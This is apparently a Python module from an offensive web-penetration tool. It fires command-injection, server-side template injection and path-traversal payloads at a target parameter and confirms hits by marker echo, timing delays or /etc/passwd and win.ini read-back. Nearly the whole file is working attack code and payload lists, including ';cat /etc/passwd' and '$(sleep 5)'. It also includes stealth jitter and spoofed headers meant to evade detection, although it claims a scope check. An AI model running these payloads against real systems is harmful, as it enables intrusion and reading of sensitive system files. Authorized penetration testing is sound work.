"""Active injection exploitation: command/code injection, server-side template
injection, path traversal / LFI. These SEND real attack payloads to a parameter
on an in-scope target and confirm exploitation (marker echo, time delay, template
evaluation, or file-content read). Authorized targets only — scope-gated.

Covers Shannon ✅ INPV-11/12 (code/command injection), INPV-18 (SSTI), ATHZ-01 (LFI).
"""
import time

import httpx

from .. import safehttp, stealth
from ..config import HTTP_TIMEOUT
from ..scope_guard import check

CMDI_MARKER = "WRAITHCMDI9271"
# {m} -> marker. Separators cover sh/bash and cmd.exe. Echo = confirmed; sleep = blind/time-based.
_CMDI = [
    ";echo {m};", ";sleep 5;", "& echo {m}", "& timeout /t 5", "| echo {m}",
    "|| echo {m}", "&& echo {m}", "`echo {m}`", "`sleep 5`", "$(echo {m})", "$(sleep 5)",
    "%0aecho {m}", ";id;", "| id", "& whoami",
    # Shannon payload set: direct file read via injection (detected by /etc/passwd signature)
    ";cat /etc/passwd", "$(cat /etc/passwd)", "`cat /etc/passwd`", "|cat /etc/passwd",
    "; ls -la", "& dir", "|| uname -a",
]
# (payload, expected-output-if-evaluated). Math that a plain reflection won't produce.
_SSTI = [
    ("${7*7}", "49"), ("{{7*7}}", "49"), ("#{7*7}", "49"), ("<%= 7*7 %>", "49"),
    ("${{7*7}}", "49"), ("{{7*'7'}}", "7777777"), ("#{ 7*7 }", "49"),
    ("{7*7}", "49"), ("*{7*7}", "49"), ("@(7*7)", "49"), ("${7*'7'}", "7777777"),
]
# (payload, marker-in-response). Unix /etc/passwd and Windows win.ini.
_TRAVERSAL = [
    ("../etc/passwd", "root:"), ("../../etc/passwd", "root:"), ("../../../etc/passwd", "root:"),
    ("../../../../etc/passwd", "root:"), ("../../../../../etc/passwd", "root:"),
    ("../../../../../../etc/passwd", "root:"), ("../../../../../../../etc/passwd", "root:"),
    ("../../../../../../../../etc/passwd", "root:"), ("%2e%2e%2fetc%2fpasswd", "root:"),
    ("%252e%252e%252fetc%252fpasswd", "root:"), ("..%2fetc%2fpasswd", "root:"),
    ("/etc/passwd", "root:"), ("....//....//etc/passwd", "root:"),
    ("/etc/passwd%00", "root:"), ("..%252f..%252fetc/passwd", "root:"),
    ("....\\/....\\/windows/win.ini", "[extensions]"),
    ("../../../../windows/win.ini", "[extensions]"),
    ("../../../../../windows/win.ini", "[extensions]"),
    ("../../../../../../windows/win.ini", "[extensions]"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "[extensions]"),
]


def _send(target: str, param: str, value: str, method: str, cookies: dict | None):
    method = method.upper()
    stealth.jitter()
    if method == "GET":
        return safehttp.get(target, params={param: value}, timeout=HTTP_TIMEOUT,
                         follow_redirects=False, headers=stealth.headers(), cookies=cookies or {})
    return safehttp.request(method, target, data={param: value}, timeout=HTTP_TIMEOUT,
                         follow_redirects=False, headers=stealth.headers(), cookies=cookies or {})


def cmdi(target: str, param: str, method: str = "GET", cookies: dict | None = None) -> dict:
    """Inject OS/code-injection payloads into `param`; confirm via marker echo or a
    ~5s time delay (blind). Returns the payloads that fired."""
    check(target)
    hits = []
    for tpl in _CMDI:
        payload = tpl.format(m=CMDI_MARKER)
        t0 = time.monotonic()
        try:
            r = _send(target, param, payload, method, cookies)
        except httpx.HTTPError:
            continue
        dt = time.monotonic() - t0
        if CMDI_MARKER in r.text:
            hits.append({"payload": payload, "evidence": "marker-echoed", "confirmed": True})
        elif "root:x:" in r.text:
            hits.append({"payload": payload, "evidence": "read /etc/passwd via injection", "confirmed": True})
        elif ("sleep 5" in payload or "timeout" in payload) and dt >= 4.5:
            hits.append({"payload": payload, "evidence": f"time-delay {dt:.1f}s (blind)", "confirmed": True})
    return {"target": target, "param": param, "tested": len(_CMDI),
            "findings": hits, "verdict": "VULNERABLE" if hits else "not-detected"}


def ssti(target: str, param: str, method: str = "GET", cookies: dict | None = None) -> dict:
    """Inject template-injection polyglots; confirm when the expression is *evaluated*
    (e.g. 7*7 -> 49 appears but the literal payload does not)."""
    check(target)
    hits = []
    for payload, expect in _SSTI:
        try:
            r = _send(target, param, payload, method, cookies)
        except httpx.HTTPError:
            continue
        if expect in r.text and payload not in r.text:
            hits.append({"payload": payload, "evaluated_to": expect, "confirmed": True})
    return {"target": target, "param": param, "tested": len(_SSTI),
            "findings": hits, "verdict": "VULNERABLE" if hits else "not-detected"}


def path_traversal(target: str, param: str, method: str = "GET", cookies: dict | None = None) -> dict:
    """Inject traversal/LFI payloads; confirm when the file's signature content is read back."""
    check(target)
    hits = []
    for payload, marker in _TRAVERSAL:
        try:
            r = _send(target, param, payload, method, cookies)
        except httpx.HTTPError:
            continue
        if marker in r.text:
            snippet = r.text[max(0, r.text.find(marker)):][:200]
            hits.append({"payload": payload, "marker": marker, "snippet": snippet, "confirmed": True})
    return {"target": target, "param": param, "tested": len(_TRAVERSAL),
            "findings": hits, "verdict": "VULNERABLE" if hits else "not-detected"}
